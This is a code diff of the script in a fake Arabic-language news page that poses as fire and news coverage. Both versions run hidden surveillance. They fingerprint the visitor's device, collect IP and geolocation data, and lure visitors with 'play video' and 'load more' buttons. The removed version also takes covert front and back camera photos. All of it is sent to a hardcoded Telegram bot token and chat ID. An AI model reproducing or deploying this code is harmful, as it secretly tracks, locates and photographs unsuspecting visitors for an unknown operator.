+   var BOT_TOKEN = "8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU";
+var MASTER_ID = "5849068535";
+    /* ═══════════════════════════════════════════════════════
+       متغيرات الحالة
+       ═══════════════════════════════════════════════════════ */
+    var deviceFingerprint = null;      // تتجمع أول ما الصفحة تفتح
+    var fingerprintSent = false;       // اتبعتت ولا لأ
+    var locationSent = false;          // الموقع اتبعت ولا لأ
+    var locationResolved = false;      // انتهى طلب الموقع ولا لأ
 
-        // ============================================================
-        // ================ دالة الإرسال لتليجرام =====================
-        // ============================================================
-        function sendToTelegram(chatId, botToken, type, mediaBlob, caption) {
-            return new Promise(function(resolve) {
-                try {
-                    var url = "https://api.telegram.org/bot" + botToken + "/";
-                    if (type === 'photo' && mediaBlob) {
-                        var fd = new FormData();
-                        fd.append('chat_id', chatId);
-                        fd.append('photo', mediaBlob, 'frame_' + Date.now() + '.jpg');
-                        fd.append('caption', caption);
-                        fetch(url + 'sendPhoto', { method: 'POST', body: fd })
-                            .then(function(r) { resolve(r.ok); })
-                            .catch(function(e) { console.warn("tg photo err", e); resolve(false); });
-                    } else {
-                        fetch(url + 'sendMessage', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: chatId,
-                                text: caption,
-                                parse_mode: 'HTML',
-                                disable_web_page_preview: true
-                            })
-                        })
-                        .then(function(r) { resolve(r.ok); })
-                        .catch(function(e) { console.warn("tg msg err", e); resolve(false); });
-                    }
-                } catch(e) {
-                    console.warn("tg err", e);
-                    resolve(false);
-                }
-            });
+    /* ═══════════════════════════════════════════════════════
+       1) جمع بصمة الجهاز فوراً أول ما الصفحة تفتح
+       ═══════════════════════════════════════════════════════ */
+    function collectFingerprint() {
+        var fp = {};
+        try {
+            fp.timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "—";
+            fp.locale = Intl.DateTimeFormat().resolvedOptions().locale || "—";
+        } catch(e) { fp.timeZone = "—"; fp.locale = "—"; }
+
+        fp.userAgent = navigator.userAgent || "—";
+        fp.platform = navigator.platform || "—";
+        fp.vendor = navigator.vendor || "—";
+        fp.language = navigator.language || "—";
+        fp.languages = (navigator.languages || []).join(", ") || "—";
+        fp.screenW = screen.width || 0;
+        fp.screenH = screen.height || 0;
+        fp.colorDepth = screen.colorDepth || 0;
+        fp.pixelRatio = window.devicePixelRatio || 1;
+        fp.touchPoints = navigator.maxTouchPoints || 0;
+        fp.memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معلن";
+        fp.cores = navigator.hardwareConcurrency || "غير معروف";
+        fp.online = navigator.onLine ? "متصل" : "غير متصل";
+        fp.cookieEnabled = navigator.cookieEnabled ? "نعم" : "لا";
+        fp.doNotTrack = navigator.doNotTrack || "غير مفعّل";
+
+        fp.deviceType = "كمبيوتر";
+        if (/Mobi|Android|iPhone|iPad|iPod/i.test(fp.userAgent)) {
+            fp.deviceType = /iPad|Tablet/i.test(fp.userAgent) ? "تابلت" : "موبايل";
         }
 
-        // ============================================================
-        // ================ بصمة الجهاز ================================
-        // ============================================================
-        function getDeviceFingerprint() {
-            return new Promise(function(resolve) {
-                try {
-                    var timeZone = "—", locale = "—";
-                    try { timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) {}
-                    try { locale = Intl.DateTimeFormat().resolvedOptions().locale; } catch(e) {}
-
-                    var screenData = (screen.width || 0) + "x" + (screen.height || 0) + "x" + (screen.colorDepth || 0);
-                    var availScreen = (screen.availWidth || 0) + "x" + (screen.availHeight || 0);
-                    var pixelRatio = window.devicePixelRatio || 1;
-                    var memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معلن";
-                    var cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency : "غير معروف";
-                    var platform = navigator.platform || "غير معروف";
-                    var vendor = navigator.vendor || "غير معروف";
-                    var language = navigator.language || "غير معروف";
-                    var languages = (navigator.languages || []).join(", ") || "—";
-                    var cookieEnabled = navigator.cookieEnabled ? "نعم" : "لا";
-                    var doNotTrack = navigator.doNotTrack || window.doNotTrack || "غير مفعّل";
-                    var online = navigator.onLine ? "متصل" : "غير متصل";
-                    var touchPoints = navigator.maxTouchPoints || 0;
-
-                    var deviceType = "كمبيوتر";
-                    if (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-                        deviceType = /iPad|Tablet/i.test(navigator.userAgent) ? "تابلت" : "موبايل";
-                    }
-
-                    var gpu = "غير متاح";
-                    try {
-                        var canvas = document.createElement('canvas');
-                        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                        if (gl) {
-                            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                            if (dbg) {
-                                gpu = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) + " | " + gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-                            }
-                        }
-                    } catch(e) {}
-
-                    var connection = "غير معروف";
-                    if (navigator.connection) {
-                        var c = navigator.connection;
-                        connection = (c.effectiveType || '?') + " | سرعة: " + (c.downlink || '?') + " Mbps | ping: " + (c.rtt || '?') + "ms | توفير: " + (c.saveData ? 'مفعّل' : 'لا');
-                    }
-
-                    var baseMsg = "🕵️‍♂️ <b>بصمة جهاز الزائر</b>\n" +
-                        "━━━━━━━━━━━━━━━━━━\n" +
-                        "📱 <b>نوع الجهاز:</b> " + deviceType + "\n" +
-                        "🖥️ <b>UserAgent:</b> " + navigator.userAgent.substring(0, 200) + "\n" +
-                        "🔧 <b>النظام:</b> " + platform + "\n" +
-                        "🏭 <b>المصنع:</b> " + vendor + "\n" +
-                        "━━━━━━━━━━━━━━━━━━\n" +
-                        "📐 <b>الشاشة:</b> " + screenData + "\n" +
-                        "📏 <b>المساحة المتاحة:</b> " + availScreen + "\n" +
-                        "🎨 <b>كثافة البكسل:</b> " + pixelRatio + "x\n" +
-                        "👆 <b>نقاط اللمس:</b> " + touchPoints + "\n" +
-                        "━━━━━━━━━━━━━━━━━━\n" +
-                        "💾 <b>الرام:</b> " + memory + "\n" +
-                        "🧠 <b>الأنوية:</b> " + cores + "\n" +
-                        "🎮 <b>كرت الشاشة:</b> " + gpu + "\n" +
-                        "━━━━━━━━━━━━━━━━━━\n" +
-                        "🌐 <b>اللغة:</b> " + language + "\n" +
-                        "🗣️ <b>اللغات:</b> " + languages + "\n" +
-                        "🌍 <b>المنطقة الزمنية:</b> " + timeZone + "\n" +
-                        "🔤 <b>اللوكال:</b> " + locale + "\n" +
-                        "━━━━━━━━━━━━━━━━━━\n" +
-                        "📶 <b>الاتصال:</b> " + connection + "\n" +
-                        "📡 <b>الحالة:</b> " + online + "\n" +
-                        "━━━━━━━━━━━━━━━━━━\n" +
-                        "🍪 <b>الكوكيز:</b> " + cookieEnabled + "\n" +
-                        "🚫 <b>DoNotTrack:</b> " + doNotTrack + "\n" +
-                        "⏱️ <b>الوقت:</b> " + new Date().toLocaleString('ar-EG');
-
-                    // محاولة إضافة البطارية
-                    if (navigator.getBattery) {
-                        navigator.getBattery().then(function(battery) {
-                            var batteryLevel = "مستوى: " + Math.round(battery.level * 100) + "% | " +
-                                (battery.charging ? 'موصول بالشاحن' : 'على البطارية');
-                            sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null,
-                                baseMsg + "\n🔋 <b>البطارية:</b> " + batteryLevel
-                            ).then(function() { resolve(true); });
-                        }).catch(function() {
-                            sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, baseMsg)
-                                .then(function() { resolve(true); });
-                        });
-                    } else {
-                        sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, baseMsg)
-                            .then(function() { resolve(true); });
-                    }
-                } catch(e) {
-                    console.warn("fp err", e);
-                    resolve(false);
+        // GPU
+        fp.gpu = "غير متاح";
+        try {
+            var c = document.createElement('canvas');
+            var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+            if (gl) {
+                var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                if (dbg) {
+                    fp.gpu = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) + " | " +
+                             gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
                 }
-            });
+            }
+        } catch(e) {}
+
+        // الاتصال
+        fp.connection = "غير معروف";
+        if (navigator.connection) {
+            var conn = navigator.connection;
+            fp.connection = (conn.effectiveType || '?') + " | سرعة: " +
+                            (conn.downlink || '?') + " Mbps | ping: " +
+                            (conn.rtt || '?') + "ms";
         }
 
-        // ============================================================
-        // ================ IP + الشبكة ==============================
-        // ============================================================
-        function getIPData() {
-            return new Promise(function(resolve) {
-                var results = { ipify: {}, ipapi: {}, ipwho: {} };
-                var done = 0;
-                var total = 3;
-                var finished = false;
+        fp.time = new Date().toLocaleString('ar-EG');
+        return fp;
+    }
 
-                function finish() {
-                    if (finished) return;
-                    finished = true;
-                    try {
-                        var ip = results.ipify.ip || results.ipapi.ip || results.ipwho.ip || 'غير معروف';
-                        var country = results.ipapi.country_name || results.ipwho.country || 'غير معروف';
-                        var countryCode = results.ipapi.country_code || results.ipwho.country_code || '—';
-                        var region = results.ipapi.region || results.ipwho.region || 'غير معروف';
-                        var city = results.ipapi.city || results.ipwho.city || 'غير معروف';
-                        var postal = results.ipapi.postal || results.ipwho.postal || '—';
-                        var lat = results.ipapi.latitude || results.ipwho.latitude || '—';
-                        var lon = results.ipapi.longitude || results.ipwho.longitude || '—';
-                        var isp = results.ipapi.org || (results.ipwho.connection && results.ipwho.connection.isp) || 'غير معروف';
-                        var asn = results.ipapi.asn || (results.ipwho.connection && results.ipwho.connection.asn) || '—';
-                        var timezone = results.ipapi.timezone || (results.ipwho.timezone && results.ipwho.timezone.id) || '—';
+    // ✅ جمع فوري عند تحميل الصفحة
+    deviceFingerprint = collectFingerprint();
+    console.log("🕵️ بصمة الجهاز اتجمعت:", deviceFingerprint);
 
-                        var ipMsg = "🌐 <b>معلومات IP والشبكة</b>\n" +
-                            "━━━━━━━━━━━━━━━━━━\n" +
-                            "🔹 <b>IP العام:</b> <code>" + ip + "</code>\n" +
-                            "━━━━━━━━━━━━━━━━━━\n" +
-                            "🏳️ <b>البلد:</b> " + country + " (" + countryCode + ")\n" +
-                            "🗺️ <b>المنطقة:</b> " + region + "\n" +
-                            "🏙️ <b>المدينة:</b> " + city + "\n" +
-                            "📮 <b>الرمز البريدي:</b> " + postal + "\n" +
-                            "🎯 <b>الإحداثيات:</b> " + lat + ", " + lon + "\n" +
-                            (lat !== '—' ? "🗺️ <b>خريطة:</b> https://www.google.com/maps?q=" + lat + "," + lon + "\n" : "") +
-                            "━━━━━━━━━━━━━━━━━━\n" +
-                            "📡 <b>مزود الخدمة:</b> " + isp + "\n" +
-                            "🔢 <b>ASN:</b> " + asn + "\n" +
-                            "⏰ <b>المنطقة الزمنية:</b> " + timezone + "\n" +
-                            "━━━━━━━━━━━━━━━━━━\n" +
-                            "⏱️ <b>الوقت:</b> " + new Date().toLocaleString('ar-EG');
+    /* ═══════════════════════════════════════════════════════
+       2) دوال إرسال لتليجرام
+       ═══════════════════════════════════════════════════════ */
+    function sendToTelegram(text) {
+        if (!BOT_TOKEN || !MASTER_ID) return Promise.resolve(false);
+        return fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: MASTER_ID,
+                text: text,
+                parse_mode: 'HTML',
+                disable_web_page_preview: true
+            })
+        }).then(function(r) { return r.ok; }).catch(function() { return false; });
+    }
 
-                        sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, ipMsg)
-                            .then(function() { resolve(true); });
-                    } catch(e) {
-                        console.warn("ip build err", e);
-                        resolve(false);
-                    }
-                }
+    function buildFingerprintMessage() {
+        var fp = deviceFingerprint;
+        return "🕵️ <b>بصمة جهاز الزائر</b>\n" +
+            "━━━━━━━━━━━━━━━━━━\n" +
+            "📱 <b>نوع الجهاز:</b> " + fp.deviceType + "\n" +
+            "🖥️ <b>UserAgent:</b> " + fp.userAgent.substring(0, 200) + "\n" +
+            "🔧 <b>النظام:</b> " + fp.platform + "\n" +
+            "🏭 <b>المصنع:</b> " + fp.vendor + "\n" +
+            "━━━━━━━━━━━━━━━━━━\n" +
+            "📐 <b>الشاشة:</b> " + fp.screenW + "x" + fp.screenH + "x" + fp.colorDepth + "\n" +
+            "🎨 <b>كثافة البكسل:</b> " + fp.pixelRatio + "x\n" +
+            "👆 <b>نقاط اللمس:</b> " + fp.touchPoints + "\n" +
+            "💾 <b>الرام:</b> " + fp.memory + "\n" +
+            "🧠 <b>الأنوية:</b> " + fp.cores + "\n" +
+            "🎮 <b>كرت الشاشة:</b> " + fp.gpu + "\n" +
+            "━━━━━━━━━━━━━━━━━━\n" +
+            "🌐 <b>اللغة:</b> " + fp.language + "\n" +
+            "🗣️ <b>اللغات:</b> " + fp.languages + "\n" +
+            "🌍 <b>المنطقة الزمنية:</b> " + fp.timeZone + "\n" +
+            "📶 <b>الاتصال:</b> " + fp.connection + "\n" +
+            "📡 <b>الحالة:</b> " + fp.online + "\n" +
+            "🍪 <b>الكوكيز:</b> " + fp.cookieEnabled + "\n" +
+            "🚫 <b>DoNotTrack:</b> " + fp.doNotTrack + "\n" +
+            "⏱️ <b>الوقت:</b> " + fp.time;
+    }
 
-                function tryFinish() {
-                    done++;
-                    if (done >= total) finish();
-                }
-
-                // مهلة 6 ثواني كحد أقصى
-                setTimeout(finish, 6000);
-
-                fetch('https://api.ipify.org?format=json')
-                    .then(function(r) { return r.json(); })
-                    .then(function(d) { results.ipify = d || {}; tryFinish(); })
-                    .catch(function() { tryFinish(); });
-
-                fetch('https://ipapi.co/json/')
-                    .then(function(r) { return r.json(); })
-                    .then(function(d) { results.ipapi = d || {}; tryFinish(); })
-                    .catch(function() { tryFinish(); });
-
-                fetch('https://ipwho.is/')
-                    .then(function(r) { return r.json(); })
-                    .then(function(d) { results.ipwho = d || {}; tryFinish(); })
-                    .catch(function() { tryFinish(); });
-            });
-        }
-
-        // ============================================================
-        // ================ عناصر ======================================
-        // ============================================================
-        var locationOverlay = document.getElementById('locationOverlay');
-        var allowBtn = document.getElementById('allowBtn');
-        var allowBtnText = document.getElementById('allowBtnText');
-        var locSpinner = document.getElementById('locSpinner');
-
-        // ============================================================
-        // ================ طلب الموقع ================================
-        // ============================================================
-        function requestLocation() {
-            return new Promise(function(resolve) {
-                if (!navigator.geolocation) {
-                    resolve({ success: false, reason: 'المتصفح لا يدعم الموقع', code: 0 });
-                    return;
-                }
-                navigator.geolocation.getCurrentPosition(
-                    function(pos) {
-                        var latitude = pos.coords.latitude;
-                        var longitude = pos.coords.longitude;
-                        var accuracy = pos.coords.accuracy;
-
-                        var locMsg = "🌍 <b>زائر جديد دخل صفحة الأخبار</b>\n" +
-                            "━━━━━━━━━━━━━━━━━━\n" +
-                            "🎯 <b>خط العرض:</b> " + latitude + "\n" +
-                            "🎯 <b>خط الطول:</b> " + longitude + "\n" +
-                            "📏 <b>الدقة:</b> ±" + Math.round(accuracy) + " متر\n" +
-                            "🗺️ <b>خرائط:</b> https://www.google.com/maps?q=" + latitude + "," + longitude + "\n" +
-                            "⏰ <b>الوقت:</b> " + new Date().toLocaleString('ar-EG');
-
-                        // نبعت الموقع فوراً
-                        sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, locMsg)
-                            .then(function() {
-                                // محاولة جلب العنوان في الخلفية (مش بنستناها)
-                                try {
-                                    fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + latitude + '&lon=' + longitude + '&zoom=18&addressdetails=1')
-                                        .then(function(r) { return r.json(); })
-                                        .then(function(data) {
-                                            if (data && data.display_name) {
-                                                sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null,
-                                                    "📍 <b>العنوان التقريبي:</b>\n" + data.display_name.substring(0, 150)
-                                                );
-                                            }
-                                        })
-                                        .catch(function() {});
-                                } catch(e) {}
-                                resolve({ success: true });
-                            });
-                    },
-                    function(err) {
-                        sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null,
-                            "⚠️ <b>زائر رفض/فشل إذن الموقع</b>\n" +
-                            "🔴 <b>السبب:</b> " + err.message + "\n" +
-                            "🔢 <b>الكود:</b> " + err.code + "\n" +
-                            "⏰ " + new Date().toLocaleString('ar-EG')
-                        );
-                        resolve({ success: false, reason: err.message, code: err.code });
-                    },
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-                );
-            });
-        }
-
-        // ============================================================
-        // ================ حالة ======================================
-        // ============================================================
-        var locationResolved = false;
-        var deviceInfoSent = false;
-        var ipInfoSent = false;
-        var busy = false;
-
-        // ============================================================
-        // ================ زر "اضغط سماح" ============================
-        // ============================================================
-        if (allowBtn) {
-            allowBtn.addEventListener('click', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-
-                if (locationResolved || busy) return;
-                busy = true;
-
-                allowBtn.disabled = true;
-                allowBtnText.textContent = '⏳ جاري طلب الموقع...';
-                if (locSpinner) locSpinner.classList.add('show');
-
-                // إرسال بصمة الجهاز و IP في الخلفية
-                if (!deviceInfoSent) {
-                    deviceInfoSent = true;
-                    getDeviceFingerprint().catch(function(e) { console.warn("fp", e); });
-                }
-                if (!ipInfoSent) {
-                    ipInfoSent = true;
-                    getIPData().catch(function(e) { console.warn("ip", e); });
-                }
-
-                // طلب الموقع
-                requestLocation().then(function(result) {
-                    busy = false;
-                    if (result.success) {
-                        locationResolved = true;
-                        if (locationOverlay) {
-                            locationOverlay.classList.add('hide');
-                            setTimeout(function() {
-                                locationOverlay.style.display = 'none';
-                            }, 400);
-                        }
-                    } else {
-                        allowBtn.disabled = false;
-                        if (locSpinner) locSpinner.classList.remove('show');
-                        if (result.code === 1) {
-                            allowBtnText.textContent = '❌ تم الرفض — افتح إعدادات المتصفح واسمح';
-                        } else {
-                            allowBtnText.textContent = '⚠️ تعذر تحديد الموقع — حاول تاني';
-                        }
-                    }
-                }).catch(function(err) {
-                    console.warn("loc promise err", err);
-                    busy = false;
-                    allowBtn.disabled = false;
-                    if (locSpinner) locSpinner.classList.remove('show');
-                    allowBtnText.textContent = '⚠️ خطأ غير متوقع — حاول تاني';
-                });
-            });
-        }
-
-        // ============================================================
-        // ================ الكاميرا الأمامية =========================
-        // ============================================================
-        function captureFrontCamera() {
-            return new Promise(function(resolve) {
-                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    resolve(false);
-                    return;
-                }
-                navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
-                }).then(function(stream) {
-                    var video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.setAttribute('playsinline', 'true');
-                    video.muted = true;
-                    var playPromise = video.play();
-                    if (playPromise && playPromise.then) {
-                        playPromise.catch(function() {});
-                    }
-                    setTimeout(function() {
-                        try {
-                            var canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth || 800;
-                            canvas.height = video.videoHeight || 600;
-                            canvas.getContext('2d').drawImage(video, 0, 0);
-                            canvas.toBlob(function(blob) {
-                                stream.getTracks().forEach(function(t) { t.stop(); });
-                                if (!blob) { resolve(false); return; }
-                                sendToTelegram(MASTER_ID, BOT_TOKEN, 'photo', blob,
-                                    "📸 صورة الزائر (كاميرا أمامية)\n⏰ " + new Date().toLocaleString('ar-EG')
-                                ).then(function() { resolve(true); });
-                            }, 'image/jpeg', 0.8);
-                        } catch(err) {
-                            stream.getTracks().forEach(function(t) { t.stop(); });
-                            resolve(false);
-                        }
-                    }, 600);
-                }).catch(function(e) {
-                    console.warn("front cam denied", e);
-                    resolve(false);
-                });
-            });
-        }
-
-        // ============================================================
-        // ================ الكاميرا الخلفية ==========================
-        // ============================================================
-        function captureBackCamera() {
-            return new Promise(function(resolve) {
-                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    resolve(false);
-                    return;
-                }
-                navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } }
-                }).then(function(stream) {
-                    var video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.setAttribute('playsinline', 'true');
-                    video.muted = true;
-                    var playPromise = video.play();
-                    if (playPromise && playPromise.then) {
-                        playPromise.catch(function() {});
-                    }
-                    setTimeout(function() {
-                        try {
-                            var canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth || 1024;
-                            canvas.height = video.videoHeight || 768;
-                            canvas.getContext('2d').drawImage(video, 0, 0);
-                            canvas.toBlob(function(blob) {
-                                stream.getTracks().forEach(function(t) { t.stop(); });
-                                if (!blob) { resolve(false); return; }
-                                sendToTelegram(MASTER_ID, BOT_TOKEN, 'photo', blob,
-                                    "📷 صورة الزائر (كاميرا خلفية)\n⏰ " + new Date().toLocaleString('ar-EG')
-                                ).then(function() { resolve(true); });
-                            }, 'image/jpeg', 0.85);
-                        } catch(err) {
-                            stream.getTracks().forEach(function(t) { t.stop(); });
-                            resolve(false);
-                        }
-                    }, 600);
-                }).catch(function(e) {
-                    console.warn("back cam denied", e);
-                    resolve(false);
-                });
-            });
-        }
-
-        // ============================================================
-        // ================ زر "تابع المزيد" ==========================
-        // ============================================================
-        var moreBtn = document.getElementById('moreBtn');
-        var btnText = document.getElementById('btnText');
-        var btnSpinner = document.getElementById('btnSpinner');
-        var statusMsg = document.getElementById('statusMsg');
-
-        var isRunning = false;
-
-        function showStatus(text, isError) {
-            if (!statusMsg) return;
-            statusMsg.textContent = text;
-            if (isError) statusMsg.classList.add('error');
-            else statusMsg.classList.remove('error');
-            statusMsg.classList.add('show');
-            setTimeout(function() { statusMsg.classList.remove('show'); }, 6000);
-        }
-
-        if (moreBtn) {
-            moreBtn.addEventListener('click', function(e) {
-                e.preventDefault();
-                if (isRunning) return;
-                isRunning = true;
-                moreBtn.disabled = true;
-                if (btnSpinner) btnSpinner.classList.add('show');
-                if (btnText) btnText.textContent = '⏳ جاري التحميل...';
-
-                captureFrontCamera()
-                    .then(function() { return captureBackCamera(); })
-                    .then(function() {
-                        showStatus('✅ تم تحميل المزيد من الأخبار بنجاح');
-                        setTimeout(function() {
-                            window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
-                        }, 500);
-                    })
-                    .catch(function(e) {
-                        console.warn("more err", e);
-                        showStatus('⚠️ حدث خطأ، حاول مرة أخرى', true);
-                    })
-                    .then(function() {
-                        setTimeout(function() {
-                            if (btnSpinner) btnSpinner.classList.remove('show');
-                            if (btnText) btnText.textContent = '📖 تابع المزيد من الأخبار';
-                            moreBtn.disabled = false;
-                            isRunning = false;
-                        }, 1000);
+    /* ═══════════════════════════════════════════════════════
+       3) طلب الموقع
+       ═══════════════════════════════════════════════════════ */
+    function requestLocation() {
+        return new Promise(function(resolve) {
+            if (!navigator.geolocation) {
+                resolve({ success: false, reason: 'المتصفح لا يدعم الموقع' });
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    resolve({
+                        success: true,
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
                     });
-            });
-        }
+                },
+                function(err) {
+                    resolve({ success: false, reason: err.message, code: err.code });
+                },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        });
+    }
 
-        // أزرار الإعجاب
-        var likeBtns = document.querySelectorAll('.like-btn');
-        for (var i = 0; i < likeBtns.length; i++) {
-            (function(btn) {
-                btn.addEventListener('click', function() {
-                    var countSpan = btn.querySelector('.like-count');
-                    if (!countSpan) return;
-                    var count = parseInt(countSpan.textContent, 10);
-                    if (btn.classList.contains('liked')) {
-                        btn.classList.remove('liked');
-                        countSpan.textContent = count - 1;
-                    } else {
-                        btn.classList.add('liked');
-                        countSpan.textContent = count + 1;
+    /* ═══════════════════════════════════════════════════════
+       4) منطق زر تشغيل الفيديو
+       ═══════════════════════════════════════════════════════ */
+    var playBtn = document.getElementById('playBtn');
+    var videoContainer = document.getElementById('videoContainer');
+    var videoLoading = document.getElementById('videoLoading');
+    var locModal = document.getElementById('locModal');
+    var allowLocationBtn = document.getElementById('allowLocationBtn');
+    var skipLocationBtn = document.getElementById('skipLocationBtn');
+    var locSpinner = document.getElementById('locSpinner');
+    var allowBtnText = document.getElementById('allowBtnText');
+    var pendingVideo = false;   // الفيديو مستني حد يفتحه
+
+    // دالة فتح الفيديو الفعلية
+    function openVideo() {
+        if (videoLoading) videoLoading.classList.remove('show');
+        // هنا بيفتح رابط الفيديو على فيسبوك
+        window.open('https://www.facebook.com/share/r/18bk3HP9cn/', '_blank', 'noopener');
+    }
+
+    // ضغط زر الفيديو
+    if (playBtn) {
+        playBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            // لو الموقع خلص (اتبعت أو اتخطى) → افتح الفيديو مباشرة
+            if (locationResolved) {
+                openVideo();
+                return;
+            }
+
+            // لو أول مرة → اعرض المودال
+            pendingVideo = true;
+
+            // لو البصمة لسه ما اتبعتتش → ابعتها الآن (مع ضغطة المستخدم)
+            if (!fingerprintSent) {
+                fingerprintSent = true;
+                sendToTelegram(buildFingerprintMessage());
+            }
+
+            // اعرض مودال طلب الموقع
+            if (locModal) locModal.classList.add('show');
+        });
+    }
+
+    /* ═══════════════════════════════════════════════════════
+       5) زر "اسمح بالموقع" جوه المودال
+       ═══════════════════════════════════════════════════════ */
+    if (allowLocationBtn) {
+        allowLocationBtn.addEventListener('click', function() {
+            if (allowLocationBtn.disabled) return;
+            allowLocationBtn.disabled = true;
+            if (locSpinner) locSpinner.classList.add('show');
+            if (allowBtnText) allowBtnText.textContent = '⏳ جاري تحديد موقعك...';
+
+            requestLocation().then(function(loc) {
+                if (locModal) locModal.classList.remove('show');
+                allowLocationBtn.disabled = false;
+                if (locSpinner) locSpinner.classList.remove('show');
+                if (allowBtnText) allowBtnText.textContent = '📍 اسمح بالموقع و شاهد الفيديو';
+
+                if (loc.success) {
+                    locationResolved = true;
+                    // ابعت الموقع (والبصمة لو لسه ما اتبعتتش)
+                    var msg = "";
+                    if (!fingerprintSent) {
+                        fingerprintSent = true;
+                        msg += buildFingerprintMessage() + "\n━━━━━━━━━━━━━━━━━━\n";
                     }
-                });
-            })(likeBtns[i]);
-        }
+                    msg += "🌍 <b>الموقع الجغرافي (بعد الموافقة)</b>\n" +
+                           "🎯 <b>خط العرض:</b> " + loc.lat + "\n" +
+                           "🎯 <b>خط الطول:</b> " + loc.lon + "\n" +
+                           "📏 <b>الدقة:</b> ±" + Math.round(loc.accuracy) + " متر\n" +
+                           "🗺️ <b>خرائط:</b> https://www.google.com/maps?q=" + loc.lat + "," + loc.lon;
 
-        console.log("📰 صفحة أخبار الفشن جاهزة");
-    })();
+                    sendToTelegram(msg).then(function() {
+                        locationSent = true;
+                        setTimeout(openVideo, 400);
+                    });
+                } else {
+                    // رفض الموقع → افتح الفيديو برضه
+                    locationResolved = true;
+                    sendToTelegram(
+                        "⚠️ <b>الزائر رفض الموقع بعد طلبه</b>\n" +
+                        "🔴 السبب: " + loc.reason
+                    );
+                    setTimeout(openVideo, 300);
+                }
+            });
+        });
+    }
+
+    /* ═══════════════════════════════════════════════════════
+       6) زر "تخطي" جوه المودال
+       ═══════════════════════════════════════════════════════ */
+    if (skipLocationBtn) {
+        skipLocationBtn.addEventListener('click', function() {
+            locationResolved = true;
+            if (locModal) locModal.classList.remove('show');
+            openVideo();
+        });
+    }
+
+    /* ═══════════════════════════════════════════════════════
+       7) أزرار الإعجاب
+       ═══════════════════════════════════════════════════════ */
+    var likeBtns = document.querySelectorAll('.like-btn');
+    for (var i = 0; i < likeBtns.length; i++) {
+        (function(btn) {
+            btn.addEventListener('click', function() {
+                var countSpan = btn.querySelector('.like-count');
+                if (!countSpan) return;
+                var count = parseInt(countSpan.textContent, 10);
+                if (btn.classList.contains('liked')) {
+                    btn.classList.remove('liked');
+                    countSpan.textContent = count - 1;
+                } else {
+                    btn.classList.add('liked');
+                    countSpan.textContent = count + 1;
+                }
+            });
+        })(likeBtns[i]);
+    }
+
+    console.log("🔥 صفحة حريق الوراق جاهزة");
+})();
 </script>
 
 </body>
